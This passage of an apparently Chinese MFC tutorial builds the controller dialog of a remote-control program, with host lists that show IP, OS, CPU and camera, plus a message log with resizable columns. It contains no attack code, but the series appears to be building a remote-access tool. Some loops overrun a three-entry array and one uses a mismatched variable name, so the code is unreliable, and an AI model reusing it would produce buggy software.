number\">80</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"摄像头\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t\t<span class=\"token number\">81</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PING\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t\t<span class=\"token number\">81</span>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>添加全局变量 int g_Column_Online_Count=7; // 列表的个数</p>\n<ol start=\"7\">\n<li>在 initList 中写入加入列表列名称的代码:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> g_Column_Online_Count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">InsertColumn</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> g_Column_Online_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">,</span> g_Column_Online_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"8\">\n<li>\n<p>在 Oninitdlg 中写入 InitList ()</p>\n</li>\n<li>\n<p>改变列表控件的属性 ICon  改为 Report</p>\n</li>\n<li>\n<p>同样的方法改动日志消息的列表控件看操作</p>\n</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 变量声明</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>size_t g_Column_Count_Message<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 列表的个数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>COLUMNSTRUCT g_Column_Message_Data<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"信息类型\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t<span class=\"token number\">68</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"时间\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t\t<span class=\"token number\">100</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"信息内容\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t    <span class=\"token number\">660</span>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 在 InitList 中添加一下代码</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> g_Column_Message_Count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tm_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">InsertColumn</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> g_Column_Message_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">,</span> LVCFMT_CENTER<span class=\"token punctuation\">,</span> g_Column_Message_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"11\">\n<li>记得改变列表控件的属性 ICon  改为 Report</li>\n</ol>\n<h2 id=\"使列表控件的列的宽度支持伸缩\"><a class=\"anchor\" href=\"#使列表控件的列的宽度支持伸缩\">#</a> 使列表控件的列的宽度支持伸缩</h2>\n<p>我们伸缩对话框的时候，发现 List 控件的每一列并不能随着窗口的拉伸而改变，现在解决这一问题！</p>\n<ol>\n<li>查找相关的函数：<br />\n <code>CListCtrl::SetColumnWidth</code> <br />\n 查看 MSDN</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token function\">SetColumnWidth</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> nCol<span class=\"token punctuation\">,</span>             <span class=\"token comment\">// 列索引</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> cx                <span class=\"token comment\">// 列宽度</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>声明列的总宽度:</li>\n</ol>\n<p>size_t g_Column_Online_Width=0;  // 列总宽度</p>\n<ol start=\"3\">\n<li>得到列的总宽度 initlist 中:</li>\n</ol>\n<p>g_Column_Online_Width+=g_Column_Online_Data [i].nWidth;       // 得到总宽度</p>\n<ol start=\"4\">\n<li>在 OnSize 添加代码:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">double</span> dcx<span class=\"token operator\">=</span>cx<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 对话框的总宽度</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>g_Column_Online_Count<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>                   <span class=\"token comment\">// 遍历每一个列</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">double</span> dd<span class=\"token operator\">=</span>g_Column_Online_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 得到当前列的宽度</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dd<span class=\"token operator\">/=</span>g_Column_Online_Width<span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 看一看当前宽度占总长度的几分之几</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dd<span class=\"token operator\">*=</span>dcx<span class=\"token punctuation\">;</span>                                       <span class=\"token comment\">// 用原来的长度乘以所占的几分之几得到当前的宽度</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> lenth<span class=\"token operator\">=</span>dd<span class=\"token punctuation\">;</span>                                   <span class=\"token comment\">// 转换为 int 类型</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>m_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetColumnWidth</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>lenth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 设置当前的宽度</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>注意使用 double 类型的变量，原因就不解释了。</li>\n</ol>\n<p>6. 改变日志的列表宽度</p>\n<p>和上面的步骤一样了</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> g_Column_Message_Width<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列总宽度</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>g_Column_Message_Width<span class=\"token operator\">+=</span>g_Column_Message_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 得到总宽度</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>g_Column_Online_Count<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>                   <span class=\"token comment\">// 遍历每一个列</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">double</span> dd<span class=\"token operator\">=</span>g_Column_Message_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 得到当前列的宽度</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tdd<span class=\"token operator\">/=</span>g_Column_Message_Width<span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 看一看当前宽度占总长度的几分之几</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tdd<span class=\"token operator\">*=</span>dcx<span class=\"token punctuation\">;</span>                                       <span class=\"token comment\">// 用原来的长度乘以所占的几分之几得到当前的宽度</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> lenth<span class=\"token operator\">=</span>dd<span class=\"token punctuation\">;</span>                                   <span class=\"token comment\">// 转换为 int 类型</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tm_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">SetColumnWidth</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>lenth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 设置当前的宽度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"7\">\n<li>改变一下流程</li>\n</ol>\n<p>在 OnInitDialog 中 ：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// TODO: 在此添加额外的初始化代码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 初始化 List 控件</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">InitList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 触发 WM_SIZE 执行 OnSize 函数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>CRect rect<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">GetWindowRect</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>rect<span class=\"token punctuation\">.</span>bottom <span class=\"token operator\">+=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在 OnSize 函数中：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">COr0RemoteDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnSize</span><span class=\"token punctuation\">(</span>UINT nType<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> cx<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> cy<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此处添加消息处理程序代码</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token class-name\">CDialogEx</span><span class=\"token operator\">::</span><span class=\"token function\">OnSize</span><span class=\"token punctuation\">(</span>nType<span class=\"token punctuation\">,</span> cx<span class=\"token punctuation\">,</span> cy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_CList_Online<span class=\"token punctuation\">.</span>m_hWnd <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tCRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 列表的左坐标</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>top <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 列表的上坐标</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> cx <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列表的右坐标</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>bottom <span class=\"token operator\">=</span> cy <span class=\"token operator\">-</span> <span class=\"token number\">160</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列表的下坐标</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_CList_Message<span class=\"token punctuation\">.</span>m_hWnd <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tCRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 列表的左坐标</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>top <span class=\"token operator\">=</span> cy <span class=\"token operator\">-</span> <span class=\"token number\">156</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 列表的上坐标</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> cx <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 列表的右坐标</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>bottom <span class=\"token operator\">=</span> cy <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列表的下坐标</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tm_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>g_Column_Online_Width <span class=\"token operator\">&amp;&amp;</span> g_Column_Message_Width<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token keyword\">double</span> dcx <span class=\"token operator\">=</span> cx<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 对话框的总宽度</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token keyword\">double</span> dd <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> g_Column_Online_Count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// 遍历每一个列</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\tdd <span class=\"token operator\">=</span> g_Column_Online_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 得到当前列的宽度</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\tdd <span class=\"token operator\">/=</span> g_Column_Online_Width<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// 看一看当前宽度占总长度的几分之几</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\tdd <span class=\"token operator\">*=</span> dcx<span class=\"token punctuation\">;</span>                                       <span class=\"token comment\">// 用原来的长度乘以所占的几分之几得到当前的宽度</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetColumnWidth</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>dd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 设置当前的宽度</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> g_Column_Online_Count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>     <span class=\"token comment\">// 遍历每一个列</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\tdd <span class=\"token operator\">=</span> g_Column_Message_Data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nWidth<span class=\"token punctuation\">;</span>\t\t\t  <span class=\"token comment\">// 得到当前列的宽度</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\tdd <span class=\"token operator\">/=</span> g_Column_Message_Width<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// 看一看当前宽度占总长度的几分之几</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\tdd <span class=\"token operator\">*=</span> dcx<span class=\"token punctuation\">;</span>                                        <span class=\"token comment\">// 用原来的长度乘以所占的几分之几得到当前的宽度</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\tm_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">SetColumnWidth</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>dd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 设置当前的宽度</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>把初始化 List 放在前面，这样做是为了后执行 MoveWindow () 触发消息并执行 OnSize 函数，这样当窗口显示的时候就是按比例调整好的了。<br />\n就不会出现，拖动前和拖动后比例差异不一样的问题了（因为拖动前显示的使我们之前手动设置的，肯定是不完美的。）</p>\n<p>附上结果：</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"列表中添加条目\"><a class=\"anchor\" href=\"#列表中添加条目\">#</a> 列表中添加条目</h2>\n<ol>\n<li>查找相关函数</li>\n</ol>\n<p><code>CListCtrl::InsertItem()</code> <br />\n InsertItem   插入条目<br />\n SetItemText  设置哪个列的文本</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> nItem<span class=\"token punctuation\">,</span>              <span class=\"token comment\">// 插入哪一行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>LPCTSTR lpszItem        <span class=\"token comment\">// 该行 0 列显示的字符</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>BOOL <span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> nItem<span class=\"token punctuation\">,</span>                   <span class=\"token comment\">// 改动那个行</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> nSubItem<span class=\"token punctuation\">,</span>                <span class=\"token comment\">// 该行中那个子列</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>LPCTSTR lpszText             <span class=\"token comment\">// 要设置的字符</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>列表设计思路:<br />\n 对于这种庞大的远控程序，我们要有一个设计思路。</li>\n</ol>\n<p>(1) 服务端上线后要显示在列表中，这样有一个统一的函数来处理会使代码更加简洁。<br />\n(2) 消息显示分为成功失败两种，还要在其中显示消息产生的时间，这样也应该有一个统一的函数来处理。</p>\n<ol start=\"3\">\n<li>上线列表添加处理:</li>\n</ol>\n<p>在对话框的类中添加函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CPCRemoteDlg</span><span class=\"token operator\">::</span><span class=\"token function\">AddList</span><span class=\"token punctuation\">(</span>CString strIP<span class=\"token punctuation\">,</span> CString strAddr<span class=\"token punctuation\">,</span> CString strPCName<span class=\"token punctuation\">,</span> CString strOS<span class=\"token punctuation\">,</span> CString strCPU<span class=\"token punctuation\">,</span> CString strVideo<span class=\"token punctuation\">,</span> CString strPing<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">InsertItem</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>strIP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 默认为 0 行  这样所有插入的新列都在最上面</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ONLINELIST_ADDR<span class=\"token punctuation\">,</span>strAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 设置列的显示字符   这里 ONLINELIST_ADDR 等 为第二节课中的枚举类型 用这样的方法</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ONLINELIST_COMPUTER_NAME<span class=\"token punctuation\">,</span>strPCName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 解决问题会避免以后扩展时的冲突</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ONLINELIST_OS<span class=\"token punctuation\">,</span>strOS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ONLINELIST_CPU<span class=\"token punctuation\">,</span>strCPU<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">SetItemText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ONLINELIST_VIDEO<span class=\"token punctuation\">,</span>strVideo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 